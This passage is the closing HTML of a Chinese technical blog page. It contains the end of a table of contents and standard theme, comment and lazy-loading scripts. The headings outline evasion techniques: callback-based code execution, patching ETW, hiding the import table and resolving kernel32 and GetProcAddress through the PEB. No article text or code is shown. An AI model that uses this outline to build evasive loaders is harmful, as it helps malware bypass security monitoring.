class="toc-item toc-level-3"><a class="toc-link" href="#CertEnumSystemStore"><span class="toc-text">CertEnumSystemStore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-text">其他回调函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%9B%9E%E8%B0%83%E6%89%A7%E8%A1%8C-CreateThreadpoolWait"><span class="toc-text">线程池回调执行-CreateThreadpoolWait</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%8D%8F%E7%A8%8B%E8%BF%90%E8%A1%8C"><span class="toc-text">创建协程运行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch-ETW"><span class="toc-text">Patch ETW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E8%A1%A8%E9%9A%90%E8%97%8F"><span class="toc-text">导入表隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%AF%BC%E5%85%A5%E8%A1%A8"><span class="toc-text">什么是导入表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-text">实现思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E5%BA%A6%E9%9A%90%E8%97%8F"><span class="toc-text">深度隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windbg%E5%88%86%E6%9E%90kernel32%E6%89%BE%E5%9F%BA%E5%9D%80"><span class="toc-text">Windbg分析kernel32找基址</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%9C%B0%E5%9D%80"><span class="toc-text">查找地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90LDR"><span class="toc-text">解析LDR</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90InLoadOrderModuleList"><span class="toc-text">解析InLoadOrderModuleList</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#x86"><span class="toc-text">x86</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X64"><span class="toc-text">X64</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%8E%B7%E5%8F%96-GetProcAddress"><span class="toc-text">动态获取 GetProcAddress</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%80%E6%98%93%E7%89%88"><span class="toc-text">简易版</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.27.0" async></script>

<!-- optional -->

  <script type="module">
  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'

  function load_comment(){
    if(!document.getElementById("waline_container"))return;

    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');

    const el = document.getElementById("waline_container");
    var path = el.getAttribute('comment_id');
    if (!path) {
      path = decodeURI(window.location.pathname);
    }

    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
      el: '#waline_container',
      path: path,
      
    }));

  }
  window.addEventListener('DOMContentLoaded', (event) => {
    load_comment();
  });

</script>




<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || null
        }
      });
    })
  }
</script><script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          loop: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script><script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->
<script type="text/javascript" src="/js/darkmode.js"></script>
</div></body></html>
